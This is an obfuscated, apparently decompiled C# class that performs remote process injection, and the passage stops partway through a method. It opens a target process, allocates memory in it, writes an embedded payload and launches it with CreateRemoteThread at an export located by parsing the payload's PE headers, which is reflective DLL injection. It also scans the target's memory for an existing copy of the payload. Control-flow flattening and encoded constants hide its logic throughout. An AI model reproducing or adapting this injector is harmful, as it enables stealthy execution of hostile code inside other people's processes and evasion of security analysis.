using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace ZTgqKtPyui;

internal class W7h8mXtAeGxR
{
	public enum Enum0
	{
		const_0 = 0x4000,
		hPjOwCN9RubD = 0x8000
	}

	public struct J6X32RRibUW0
	{
		public IntPtr Mx2Jch3sCAut;

		public IntPtr sJxg9vdBt5Gc;

		public uint uint_0;

		public IntPtr Tb654gZpJulT;

		public uint rNmo016ZVCUZ;

		public uint uint_1;

		public uint Cu7pvYDbxFFQ;
	}

	public enum bJuKxoxnxZlg : uint
	{
		lXL2XJpwMpEn = 16u,
		const_1 = 32u,
		hxGO0uc5G1tD = 64u,
		YWGiGldpZLrn = 128u,
		OCYuV6fQWCYH = 1u,
		QhGLhSgZQNLY = 2u,
		const_6 = 4u,
		a7eK3RUeHbp8 = 8u,
		YHu7gTPiKaKM = 256u,
		axRhaS90qguM = 512u,
		tR6QW0SjX6iO = 1024u
	}

	private byte[] E6Fbp6UETzAz;

	private const int sLdpPREyqWm3 = 2;

	private const int ORU3DXihVxk4 = 1024;

	private const int Qvf6wFESc7Wu = 8;

	private const int DsM03LrjoxM7 = 32;

	private const int ESqMJFlmRKie = 16;

	private const uint eeeacXEs4GSO = 4096u;

	private const uint uint_0 = 8192u;

	private const uint uint_1 = 4u;

	private const uint PjjanuFhuiq8 = uint.MaxValue;

	private const uint NXE8XpUmMJy0 = 128u;

	private const uint uint_2 = 0u;

	private const uint cdf0QrX5QFbH = 258u;

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int iNV78GfBxCaN, bool au5zf0nezyRI, int oGae7Z9uQpOC);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetModuleHandle(string L4PZJQrNAwv5);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr EgpNccThQHB5, string h9bhQFSci75p);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr DHl6fzYRZ7Gd, IntPtr DXGIVWP3aHGS, uint uint_3, uint GIB1XSuH50yE, uint sLJ4dm7NobaW);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr av00bMhntS6v, IntPtr lBlF4tCXStYQ, byte[] f0tCNVk4uKj7, uint VntmHtgFRZru, out UIntPtr zAK59QEzpeHx);

	[DllImport("kernel32.dll")]
	private static extern IntPtr CreateRemoteThread(IntPtr jlJ0mhegd6JT, IntPtr bQrEJ0tHmUDE, uint GCqiqrrdDean, IntPtr rRBgfnuJtYaw, IntPtr zlblC1uP9Xs6, uint uint_3, IntPtr wb0ZJkJ17Umu);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr dDuUEXap4fGX);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint WaitForSingleObject(IntPtr MqMX5KjeJin0, uint uint_3);

	[DllImport("kernel32.dll")]
	private static extern bool GetExitCodeThread(IntPtr Qtc8qYO5h8nT, out uint sPxIG2wMSPGV);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr KirjM4fdV4OE, IntPtr W8Pbf5PjcuVY, [Out] byte[] JR6QEHotVV4X, int h0sVDRDQ0Bmi, out int OcubTn8PuUv8);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr F850PHUargWn, IntPtr intptr_0, int rMg7J6cb30RY, Enum0 txrVHNrPeKdc);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern int VirtualQueryEx(IntPtr UeGC3DMd3WkH, IntPtr intptr_0, out J6X32RRibUW0 DkZF4sDwGTZj, uint uint_3);

	public W7h8mXtAeGxR(byte[] iWKsr7TZj8xT)
	{
		if (iWKsr7TZj8xT.Length > _003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(35086850u))
		{
			E6Fbp6UETzAz = iWKsr7TZj8xT;
		}
	}

	public bool xaWQMyT5lWT8(int kv9X3kA6XcFS)
	{
		Process process_ = W7h8mXtAeGxR.wHwUgbefPvYAVudmmKMuUsczWLeL(kv9X3kA6XcFS);
		IntPtr intPtr2 = default(IntPtr);
		uint num4 = default(uint);
		IntPtr intPtr = default(IntPtr);
		IntPtr intPtr3 = default(IntPtr);
		uint sPxIG2wMSPGV = default(uint);
		IntPtr rRBgfnuJtYaw = default(IntPtr);
		while (true)
		{
			int num = -502626172;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(~(num2 * -433608629))) % 24u)
				{
				case 23u:
				{
					int num11;
					int num12;
					if (intPtr2 == IntPtr.Zero)
					{
						num11 = -350686008;
						num12 = -350686008;
					}
					else
					{
						num11 = 1988848171;
						num12 = 1988848171;
					}
					num = num11 ^ ((int)num3 * -355874193);
					continue;
				}
				case 22u:
				{
					int num8;
					int num9;
					if (num4 != 0)
					{
						num8 = 988547737;
						num9 = 988547737;
					}
					else
					{
						num8 = 1826548007;
						num9 = 1826548007;
					}
					num = num8 ^ (int)(num3 * 804381995);
					continue;
				}
				case 21u:
					VirtualFreeEx(intPtr, intPtr2, E6Fbp6UETzAz.Length, (Enum0)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(230864761u));
					num = (int)((num3 * 1284397972) ^ 0x7FE1B8E6);
					continue;
				case 19u:
					WaitForSingleObject(intPtr3, (uint)_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(432583950u));
					num = (int)(num3 * 1488858693) ^ -629334222;
					continue;
				case 17u:
					sPxIG2wMSPGV = (uint)_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1107493561u);
					num = (int)((num3 * 1231169394) ^ 0x6B5D4CAC);
					continue;
				case 15u:
					CloseHandle(intPtr);
					num = ((int)num3 * -991087476) ^ 0x1B993A83;
					continue;
				case 14u:
					intPtr2 = VirtualAllocEx(intPtr, IntPtr.Zero, (uint)E6Fbp6UETzAz.Length, (uint)_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(427159708u), (uint)_003CModule_003E.hhxFDPmIHoufoEIvTzswdgBraYsK<int>(906147097u));
					num = -695427064;
					continue;
				case 12u:
					intPtr3 = CreateRemoteThread(intPtr, IntPtr.Zero, (uint)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(2607518149u), rRBgfnuJtYaw, intPtr2, (uint)_003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(3942883017u), IntPtr.Zero);
					num = -1734253050;
					continue;
				case 11u:
				{
					intPtr = OpenProcess(_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(1718058323u), (byte)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(413652732u) != 0, W7h8mXtAeGxR.pRXKZRZCCorpByYQbLuFTKYswZEK(process_));
					int num6;
					int num7;
					if (!(intPtr == IntPtr.Zero))
					{
						num6 = -1365579288;
						num7 = -1365579288;
					}
					else
					{
						num6 = -888016950;
						num7 = -888016950;
					}
					num = num6 ^ ((int)num3 * -1474980461);
					continue;
				}
				case 9u:
					VirtualFreeEx(intPtr, intPtr2, E6Fbp6UETzAz.Length, (Enum0)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(3150071261u));
					num = (int)((num3 * 1113690797) ^ 0x7B23DB22);
					continue;
				case 8u:
					GetExitCodeThread(intPtr3, out sPxIG2wMSPGV);
					CloseHandle(intPtr3);
					num = ((int)num3 * -841733154) ^ -1352675168;
					continue;
				case 7u:
				{
					int num15;
					if (intPtr != IntPtr.Zero)
					{
						num = -163371952;
						num15 = -163371952;
					}
					else
					{
						num = -1287286601;
						num15 = -1287286601;
					}
					continue;
				}
				case 5u:
				{
					int num13;
					int num14;
					if (!(intPtr3 != IntPtr.Zero))
					{
						num13 = -1893214550;
						num14 = -1893214550;
					}
					else
					{
						num13 = 1304630462;
						num14 = 1304630462;
					}
					num = num13 ^ (int)(num3 * 686803522);
					continue;
				}
				case 4u:
					num4 = d7aeLiT8XaHc(_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<string>(3168496170u));
					num = -859286077;
					continue;
				case 2u:
				{
					int num10;
					if (sPxIG2wMSPGV == 0)
					{
						num = -1895522834;
						num10 = -1895522834;
					}
					else
					{
						num = 1473150908;
						num10 = 1473150908;
					}
					continue;
				}
				case 1u:
				{
					rRBgfnuJtYaw = new IntPtr(intPtr2.ToInt64() + num4);
					int num5;
					if (WriteProcessMemory(intPtr, intPtr2, E6Fbp6UETzAz, (uint)E6Fbp6UETzAz.Length, out var _))
					{
						num = 1373344897;
						num5 = 1373344897;
					}
					else
					{
						num = 1629813330;
						num5 = 1629813330;
					}
					continue;
				}
				case 0u:
					CloseHandle(intPtr);
					num = ((int)num3 * -362493132) ^ 0x316455AF;
					continue;
				case 16u:
					break;
				default:
					return (byte)_003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(3570052978u) != 0;
				case 6u:
					return (byte)_003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(1157660488u) != 0;
				case 10u:
					CloseHandle(intPtr);
					return (byte)_003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(1565316700u) != 0;
				case 13u:
					return (byte)_003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(1565316700u) != 0;
				case 18u:
					return (byte)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(3796529857u) != 0;
				case 20u:
					CloseHandle(intPtr);
					return (byte)_003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(3942883017u) != 0;
				}
				break;
			}
		}
	}

	public IntPtr Ya9khNABzMBy(int uRA4JbEQ7gg4)
	{
		IntPtr result = IntPtr.Zero;
		Process process_ = W7h8mXtAeGxR.wHwUgbefPvYAVudmmKMuUsczWLeL(uRA4JbEQ7gg4);
		IntPtr intPtr = OpenProcess(_003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(1818807471u), (byte)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(3796529857u) != 0, W7h8mXtAeGxR.pRXKZRZCCorpByYQbLuFTKYswZEK(process_));
		int num6 = default(int);
		J6X32RRibUW0 DkZF4sDwGTZj = default(J6X32RRibUW0);
		long num7 = default(long);
		byte[] array = default(byte[]);
		long num14 = default(long);
		while (true)
		{
			int num = -1919585211;
			while (true)
			{
				int num2 = num;
				uint num3;
				int OcubTn8PuUv;
				switch ((num3 = (uint)((num2 ^ -2040621465) + 601698416)) % 20u)
				{
				case 19u:
					num6 = _003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(1565316700u);
					num = ((int)num3 * -1406509272) ^ -308646457;
					continue;
				case 17u:
				{
					int num10;
					int num11;
					if (DkZF4sDwGTZj.rNmo016ZVCUZ != (uint)_003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(1879960092u))
					{
						num10 = -1013835357;
						num11 = -1013835357;
					}
					else
					{
						num10 = 930416013;
						num11 = 930416013;
					}
					num = num10 ^ ((int)num3 * -589317804);
					continue;
				}
				case 16u:
					result = new IntPtr(DkZF4sDwGTZj.Mx2Jch3sCAut.ToInt64() + num6);
					num = ((int)num3 * -492639235) ^ -2076046166;
					continue;
				case 15u:
					CloseHandle(intPtr);
					num = ((int)num3 * -1618884224) ^ -2043036653;
					continue;
				case 12u:
				{
					int num16;
					if (VirtualQueryEx(intPtr, (IntPtr)num7, out DkZF4sDwGTZj, (uint)W7h8mXtAeGxR.nsSCMfeqsuUEyDLMIhepHjWEFtswB(W7h8mXtAeGxR.uXDvaNPssQJaSZqpbDiYgZnakjtpA(typeof(J6X32RRibUW0).TypeHandle))) == 0)
					{
						num = 1879177138;
						num16 = 1879177138;
					}
					else
					{
						num = 1924789976;
						num16 = 1924789976;
					}
					continue;
				}
				case 11u:
				{
					int num17;
					if (!rJC4yWBl3uK5(array, num6))
					{
						num = -1924212230;
						num17 = -1924212230;
					}
					else
					{
						num = 1771700064;
						num17 = 1771700064;
					}
					continue;
				}
				case 10u:
				{
					int num12;
					int num13;
					if (!(intPtr == IntPtr.Zero))
					{
						num12 = -158622356;
						num13 = -158622356;
					}
					else
					{
						num12 = -287767106;
						num13 = -287767106;
					}
					num = num12 ^ ((int)num3 * -365192698);
					continue;
				}
				case 9u:
					num6 += _003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(2048653288u);
					num = -1326791187;
					continue;
				case 8u:
					num = (int)(num3 * 47199637) ^ -540300731;
					continue;
				case 7u:
					num7 = DkZF4sDwGTZj.Mx2Jch3sCAut.ToInt64() + DkZF4sDwGTZj.Tb654gZpJulT.ToInt64();
					num = -698093982;
					continue;
				case 6u:
				{
					int num18;
					if (num6 + E6Fbp6UETzAz.Length < array.Length)
					{
						num = -1905967548;
						num18 = -1905967548;
					}
					else
					{
						num = 1710541511;
						num18 = 1710541511;
					}
					continue;
				}
				case 4u:
				{
					int num15;
					if (num7 < num14)
					{
						num = -1286301317;
						num15 = -1286301317;
					}
					else
					{
						num = -1026248371;
						num15 = -1026248371;
					}
					continue;
				}
				case 3u:
					num7 = _003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(413652732u);
					num14 = _003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(2329561992u);
					OcubTn8PuUv = _003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1107493561u);
					num = 1710541511;
					continue;
				case 2u:
				{
					int num8;
					int num9;
					if (DkZF4sDwGTZj.uint_1 == (uint)_003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(171245188u))
					{
						num8 = -756869609;
						num9 = -756869609;
					}
					else
					{
						num8 = 166663131;
						num9 = 166663131;
					}
					num = num8 ^ (int)(num3 * 690175090);
					continue;
				}
				case 0u:
				{
					array = new byte[DkZF4sDwGTZj.Tb654gZpJulT.ToInt64()];
					int num4;
					int num5;
					if (!ReadProcessMemory(intPtr, DkZF4sDwGTZj.Mx2Jch3sCAut, array, array.Length, out OcubTn8PuUv))
					{
						num4 = 707992931;
						num5 = 707992931;
					}
					else
					{
						num4 = 795743720;
						num5 = 795743720;
					}
					num = num4 ^ ((int)num3 * -101014881);
					continue;
				}
				case 14u:
					break;
				case 1u:
					CloseHandle(intPtr);
					return result;
				case 5u:
					return result;
				case 13u:
					return result;
				default:
					CloseHandle(intPtr);
					return result;
				}
				break;
			}
		}
	}

	private bool rJC4yWBl3uK5(byte[] bi6YKW0T0QBz, int BSSiL7p5g4rv)
	{
		if (bi6YKW0T0QBz.LongLength < E6Fbp6UETzAz.Length + BSSiL7p5g4rv)
		{
			goto IL_011d;
		}
		goto IL_0174;
		IL_0174:
		int num = _003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(965178568u);
		int num2 = 1280487746;
		goto IL_0122;
		IL_0122:
		while (true)
		{
			int num3 = num2;
			uint num4;
			switch ((num4 = (uint)(~(-(num3 ^ 0x11893578) * -1719651357) - 1314777125)) % 12u)
			{
			case 10u:
				break;
			case 9u:
				goto IL_005c;
			case 8u:
				num = _003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(965178568u);
				num2 = ((int)num4 * -1320056465) ^ -1545616759;
				continue;
			case 6u:
				num += _003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(2974719385u);
				num2 = ((int)num4 * -963976846) ^ -261642999;
				continue;
			case 4u:
			{
				int num5;
				int num6;
				if (num < E6Fbp6UETzAz.Length)
				{
					num5 = 57443536;
					num6 = 57443536;
				}
				else
				{
					num5 = -396022900;
					num6 = -396022900;
				}
				num2 = num5 ^ (int)(num4 * 1448158788);
				continue;
			}
			case 2u:
				goto IL_00e6;
			case 1u:
				num2 = ((int)num4 * -588779325) ^ 0x6F7B960A;
				continue;
			case 0u:
				goto end_IL_0122;
			case 3u:
				goto IL_0174;
			default:
				return (byte)_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(1384272914u) != 0;
			case 7u:
				return (byte)_003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(716240967u) != 0;
			case 11u:
				return (byte)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(2607518149u) != 0;
			}
			int num7;
			if (num == E7d1XEuKBRaB(E6Fbp6UETzAz, tdW4cwWmOO61(E6Fbp6UETzAz) + (uint)_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(3114755098u)))
			{
				num2 = 903602503;
				num7 = 903602503;
			}
			else
			{
				num2 = 1775825837;
				num7 = 1775825837;
			}
			continue;
			IL_00e6:
			int num8;
			if (bi6YKW0T0QBz[num + BSSiL7p5g4rv] == E6Fbp6UETzAz[num])
			{
				num2 = -1111638748;
				num8 = -1111638748;
			}
			else
			{
				num2 = 1453553996;
				num8 = 1453553996;
			}
			continue;
			IL_005c:
			int num9;
			if (num + BSSiL7p5g4rv >= bi6YKW0T0QBz.LongLength)
			{
				num2 = 1453553996;
				num9 = 1453553996;
			}
			else
			{
				num2 = 1598339018;
				num9 = 1598339018;
			}
			continue;
			end_IL_0122:
			break;
		}
		goto IL_011d;
		IL_011d:
		num2 = 1343267675;
		goto IL_0122;
	}

	public IntPtr XoBzhaffWRrn(int m0SxYC2JSheS, string QEgBs7J50aTb)
	{
		IntPtr result = IntPtr.Zero;
		IntPtr intPtr = default(IntPtr);
		uint num4 = default(uint);
		while (true)
		{
			int num = 35666423;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(-(-(num2 - -883197923 + 258759133) ^ 0x6952F90F))) % 7u)
				{
				case 5u:
				{
					intPtr = Ya9khNABzMBy(m0SxYC2JSheS);
					int num6;
					int num7;
					if (!(intPtr == IntPtr.Zero))
					{
						num6 = -657316341;
						num7 = -657316341;
					}
					else
					{
						num6 = 383996443;
						num7 = 383996443;
					}
					num = num6 ^ ((int)num3 * -1216103022);
					continue;
				}
				case 3u:
					result = new IntPtr(intPtr.ToInt64() + num4);
					num = -838454721;
					continue;
				case 1u:
				{
					num4 = AyygA3a1Mldd(QEgBs7J50aTb);
					int num5;
					if (num4 != 0)
					{
						num = -1030546928;
						num5 = -1030546928;
					}
					else
					{
						num = -163409842;
						num5 = -163409842;
					}
					continue;
				}
				case 6u:
					break;
				case 0u:
					return result;
				case 2u:
					return result;
				default:
					return result;
				}
				break;
			}
		}
	}

	private bool IcnPzACEVdLI(byte[] ejySpjTzwK4h)
	{
		if (PatpZowgVYED(ejySpjTzwK4h, (uint)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3544027488u)) != _003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(843131164u))
		{
			goto IL_0078;
		}
		goto IL_00cd;
		IL_00cd:
		uint num = E7d1XEuKBRaB(ejySpjTzwK4h, (uint)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(311921798u));
		int num2;
		int num3;
		if (E7d1XEuKBRaB(ejySpjTzwK4h, num) == (uint)_003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(2191897459u))
		{
			num2 = 218600398;
			num3 = 218600398;
		}
		else
		{
			num2 = -1404864139;
			num3 = -1404864139;
		}
		goto IL_007d;
		IL_007d:
		uint llGcLUXhU9bu = default(uint);
		while (true)
		{
			int num4 = num2;
			uint num5;
			switch ((num5 = (uint)(~(-num4) * -1331665513 + -2141225542) ^ 0x4FA25B78u) % 8u)
			{
			case 5u:
				llGcLUXhU9bu = num + (uint)_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(338673666u);
				num2 = -284189750;
				continue;
			case 1u:
			{
				int num6;
				int num7;
				if (PatpZowgVYED(ejySpjTzwK4h, llGcLUXhU9bu) == _003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(3472504293u))
				{
					num6 = -642379055;
					num7 = -642379055;
				}
				else
				{
					num6 = 979143375;
					num7 = 979143375;
				}
				num2 = num6 ^ ((int)num5 * -1296502290);
				continue;
			}
			case 0u:
				break;
			case 3u:
				goto IL_00cd;
			case 2u:
				return (byte)_003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(3646087994u) != 0;
			default:
				return (byte)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(2905113583u) != 0;
			case 6u:
				return (byte)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(2607518149u) != 0;
			case 7u:
				return (byte)_003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(3942883017u) != 0;
			}
			break;
		}
		goto IL_0078;
		IL_0078:
		num2 = 841522604;
		goto IL_007d;
	}

	private uint PaTYAs5Cebf5(byte[] UKFEI9RAsw9s)
	{
		return E7d1XEuKBRaB(UKFEI9RAsw9s, (uint)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(311921798u));
	}

	private uint bfDpfW0ctgAg(byte[] byte_0)
	{
		return PaTYAs5Cebf5(byte_0) + (uint)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(3292677226u);
	}

	private uint tdW4cwWmOO61(byte[] tBvCp843n7mU)
	{
		return PaTYAs5Cebf5(tBvCp843n7mU) + (uint)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(1242306160u);
	}

	private uint d7aeLiT8XaHc(string GbH0y6tkfBka)
	{
		byte[] e6Fbp6UETzAz = E6Fbp6UETzAz;
		uint num4 = default(uint);
		while (true)
		{
			int num = -1382443032;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)((~(num2 + 1437453408) ^ 0x3CE50CD) * 1117525277)) % 7u)
				{
				case 6u:
				{
					int num7;
					int num8;
					if (num4 != 0)
					{
						num7 = 102115411;
						num8 = 102115411;
					}
					else
					{
						num7 = 1454852414;
						num8 = 1454852414;
					}
					num = num7 ^ (int)(num3 * 1516488295);
					continue;
				}
				case 5u:
				{
					int num5;
					int num6;
					if (!IcnPzACEVdLI(e6Fbp6UETzAz))
					{
						num5 = 1208620701;
						num6 = 1208620701;
					}
					else
					{
						num5 = 513049977;
						num6 = 513049977;
					}
					num = num5 ^ (int)(num3 * 715646133);
					continue;
				}
				case 0u:
					num4 = AyygA3a1Mldd(GbH0y6tkfBka);
					num = -1937309787;
					continue;
				case 3u:
					break;
				case 1u:
					return (uint)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(3796529857u);
				default:
					return WDRrlIUwD2hW(e6Fbp6UETzAz, num4);
				case 4u:
					return (uint)_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(1384272914u);
				}
				break;
			}
		}
	}

	private uint AyygA3a1Mldd(string oBsx8p9pLBfd)
	{
		byte[] e6Fbp6UETzAz = E6Fbp6UETzAz;
		int num8 = default(int);
		uint num12 = default(uint);
		uint num17 = default(uint);
		uint num10 = default(uint);
		uint num9 = default(uint);
		uint gEVOPzoMQP = default(uint);
		int num5 = default(int);
		uint num13 = default(uint);
		uint num4 = default(uint);
		uint result = default(uint);
		uint num11 = default(uint);
		while (true)
		{
			int num = -1517920625;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)((((num2 ^ 0x2C3A6BA2) - -1533705093) ^ 0x2D89D7A4 ^ -1854349445) * -1770740019)) % 22u)
				{
				case 21u:
					num8 += _003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(1669414603u);
					num = ((int)num3 * -844843103) ^ 0x5F99C0C5;
					continue;
				case 20u:
					num12 += (uint)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(456279502u);
					num = 983231861;
					continue;
				case 19u:
				{
					int num20;
					if (num12 >= num17)
					{
						num = -452289605;
						num20 = -452289605;
					}
					else
					{
						num = 1183767465;
						num20 = 1183767465;
					}
					continue;
				}
				case 18u:
					num10 = WDRrlIUwD2hW(e6Fbp6UETzAz, E7d1XEuKBRaB(e6Fbp6UETzAz, num9 + (uint)_003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(1305356451u)));
					num = -1804931136;
					continue;
				case 17u:
				{
					num9 = WDRrlIUwD2hW(e6Fbp6UETzAz, gEVOPzoMQP);
					int num15;
					int num16;
					if (num9 == 0)
					{
						num15 = -1505936467;
						num16 = -1505936467;
					}
					else
					{
						num15 = -1155904220;
						num16 = -1155904220;
					}
					num = num15 ^ (int)(num3 * 1898440164);
					continue;
				}
				case 16u:
					num5 = _003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(3902099270u);
					num = ((int)num3 * -974811291) ^ -2130037568;
					continue;
				case 15u:
				{
					int num18;
					int num19;
					if (!IcnPzACEVdLI(e6Fbp6UETzAz))
					{
						num18 = -1431381193;
						num19 = -1431381193;
					}
					else
					{
						num18 = -97525042;
						num19 = -97525042;
					}
					num = num18 ^ ((int)num3 * -1360634223);
					continue;
				}
				case 14u:
					num13 = WDRrlIUwD2hW(e6Fbp6UETzAz, E7d1XEuKBRaB(e6Fbp6UETzAz, num9 + (uint)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(1041223998u)));
					num17 = E7d1XEuKBRaB(e6Fbp6UETzAz, num9 + (uint)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(1242306160u));
					num = (int)((num3 * 1576776878) ^ 0x1AD97B8F);
					continue;
				case 13u:
				{
					uint gEVOPzoMQP2 = (uint)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(413652732u);
					num5 = _003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3544027488u);
					num4 = (uint)_003CModule_003E.VguPgoTrXvPCMVGFojAhlJGYxlME<int>(335875283u);
					result = (uint)_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(1384272914u);
					num = (int)(num3 * 622689214) ^ -1451777843;
					continue;
				}
				case 12u:
				{
					int num14;
					if (e6Fbp6UETzAz[num4 + num8] != 0)
					{
						num = -697195753;
						num14 = -697195753;
					}
					else
					{
						num = -1006930582;
						num14 = -1006930582;
					}
					continue;
				}
				case 11u:
					num12 = (uint)_003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(1157660488u);
					num = (int)(num3 * 590734466) ^ -257789377;
					continue;
				case 9u:
				{
					uint gEVOPzoMQP2 = E7d1XEuKBRaB(e6Fbp6UETzAz, num13 + (uint)((int)num12 * _003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3600386134u)));
					num4 = WDRrlIUwD2hW(e6Fbp6UETzAz, gEVOPzoMQP2);
					num = 154332244;
					continue;
				}
				case 8u:
					result = E7d1XEuKBRaB(e6Fbp6UETzAz, num10 + (uint)((int)num12 * _003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(3292677226u)));
					num = ((int)num3 * -465027032) ^ 0x2D2A64BB;
					continue;
				case 7u:
					num5 += _003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(456279502u);
					num = 667568413;
					continue;
				case 6u:
					E7d1XEuKBRaB(e6Fbp6UETzAz, num11 + (uint)_003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(4038000576u));
					num = ((int)num3 * -746941255) ^ 0x65D41EE9;
					continue;
				case 2u:
					num8 = _003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(1157660488u);
					num = ((int)num3 * -69827365) ^ 0x5D8B40D6;
					continue;
				case 1u:
					num11 = tdW4cwWmOO61(e6Fbp6UETzAz) + (uint)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(3867670790u);
					gEVOPzoMQP = E7d1XEuKBRaB(e6Fbp6UETzAz, num11);
					num = -1695970018;
					continue;
				case 0u:
				{
					int num6;
					int num7;
					if (W7h8mXtAeGxR.OlqFieAjAStQJQntaDlCkjLUUnBGA(W7h8mXtAeGxR.zVOhnZLtquukkQjFmgojCRbvchnc(W7h8mXtAeGxR.JyiwSChPtXtQvuEptOduyEFJRquc(), e6Fbp6UETzAz, (int)num4, num5), oBsx8p9pLBfd) == 0)
					{
						num6 = -1500539800;
						num7 = -1500539800;
					}
					else
					{
						num6 = -912759240;
						num7 = -912759240;
					}
					num = num6 ^ ((int)num3 * -2045695400);
					continue;
				}
				case 10u:
					break;
				default:
					return result;
				case 4u:
					return (uint)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3544027488u);
				case 5u:
					return (uint)_003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(965178568u);
				}
				break;
			}
		}
	}

	private uint WDRrlIUwD2hW(byte[] YNANNX0OW8dt, uint GEVOPzoMQP05)
	{
		uint num = tdW4cwWmOO61(YNANNX0OW8dt);
		uint num2 = bfDpfW0ctgAg(YNANNX0OW8dt);
		ushort num3 = PatpZowgVYED(YNANNX0OW8dt, num2 + (uint)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(2138466376u));
		uint aeBS8YFvFkMh = num + num3;
		ushort k09WQWMHfzQf = PatpZowgVYED(YNANNX0OW8dt, num2 + (uint)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(2978023270u));
